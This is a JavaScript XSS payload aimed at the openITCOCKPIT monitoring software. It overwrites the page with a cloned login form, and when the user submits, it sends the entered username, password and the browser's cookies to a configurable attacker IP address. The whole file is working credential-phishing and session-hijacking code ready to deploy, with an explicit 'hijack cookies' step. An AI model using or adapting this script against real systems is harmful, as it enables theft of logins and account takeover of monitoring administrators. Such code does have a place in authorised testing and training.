loginhtml = 
`<!DOCTYPE html>
<html lang="en">
<head>
    <!--[if IE]>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <![endif]-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>
        Login - open source system monitoring    </title>
    <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="icon"/><link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="shortcut icon"/>    <link rel="stylesheet" type="text/css"
          href="/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2"/>
    <link rel="stylesheet" type="text/css"
          href="/smartadmin/css/font-awesome.min.css?v3.7.2"/>
    <link rel="stylesheet" type="text/css" href="/css/login.css?1754142421"/>

    <script type="text/javascript"
            src="/frontend/js/lib/jquery.min.js?v3.7.2"></script>
    <script type="text/javascript" src="/js/lib/particles.min.js?v3.7.2"></script>
    <script type="text/javascript" src="/js/login.js?1754142421"></script>


</head>
<body class="main">


    <div class="login-screen">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class="container-fluid">
    <div class="row">
                    <div id="particles-js" class="col-xs-12 col-sm-6 col-md-7 col-lg-9"></div>
            </div>
</div>

<div class="login-center">
    <div class="min-height container-fluid">
        <div class="row">
            <div class="col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9">
                <div class="login" id="card">
                    <div class="login-alert">
                                                                    </div>
                    <div class="login-header">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class="login-form-div">
                        <div class="front signin_form">
                            <p>Login</p>
                            <form action="/login/login" novalidate="novalidate" id="login-form" class="login-form" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div>
                            
                            <div class="form-group">
                                <div class="input-group">
                                    <input name="data[LoginUser][username]" class="form-control" placeholder="Type your email or username" inputDefaults="  " type="text" id="LoginUserUsername"/>                                    <span class="input-group-addon">
                                        <i class="fa fa-lg fa-user"></i>
                                    </span>
                                </div>
                            </div>


                            <div class="form-group">
                                <div class="input-group">
                                    <input name="data[LoginUser][password]" class="form-control" placeholder="Type your password" inputDefaults="  " type="password" id="LoginUserPassword"/>                                    <span class="input-group-addon">
                                        <i class="fa fa-lg fa-lock"></i>
                                    </span>
                                </div>
                            </div>

                            <div class="checkbox">
                                <div class="checkbox"><input type="hidden" name="data[LoginUser][remember_me]" id="LoginUserRememberMe_" value="0"/><label for="LoginUserRememberMe"><input type="checkbox" name="data[LoginUser][remember_me]" class="" value="1" id="LoginUserRememberMe"/> Remember me on this computer</label></div>                            </div>

                            <div class="form-group sign-btn">
                                <button type="submit" class="btn btn-primary pull-right">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="footer">
    <div class="container-fluid">
        <div class="row pull-right">
            <div class="col-xs-12">
                <a href="https://openitcockpit.io/" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-globe"></i>
                </a>
                <a href="https://github.com/it-novum/openITCOCKPIT" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-github"></i>
                </a>
                <a href="https://twitter.com/openITCOCKPIT" target="_blank" class="btn btn-default">
                    <i class="fa fa-lg fa-twitter"></i>
                </a>
            </div>
        </div>
    </div>
</div>



<div class="container">
    <div class="row">
        <div class="col-xs-12">
                    </div>
    </div>
</div>
</body>
</html>`;
document.getElementsByTagName("html")[0].innerHTML = loginhtml;
var attacker = '192.168.45.203' // CHANGE ME
form = document.getElementById("login-form");
var xhr = new XMLHttpRequest();
form.onsubmit = function(e) {
    e.preventDefault();
    var login_username = document.getElementById("LoginUserUsername").value;
    var login_password = document.getElementById("LoginUserPassword").value;
    // send login creds
    var formData = new FormData();
    formData.append("usr", login_username);
    formData.append("pwd", login_password);

    xhr.open('POST', `https://${attacker}:80/credential`, true);
    xhr.send(formData);

    // hijack cookies
    var cookies = document.cookie;
    var cookieData = new FormData();
    cookieData.append("name", "document.cookie");
    cookieData.append("value", cookies);

    var xhrCookies = new XMLHttpRequest();
    xhrCookies.open('POST', `https://${attacker}:80/cookie`, true);
    xhrCookies.send(cookieData);

}
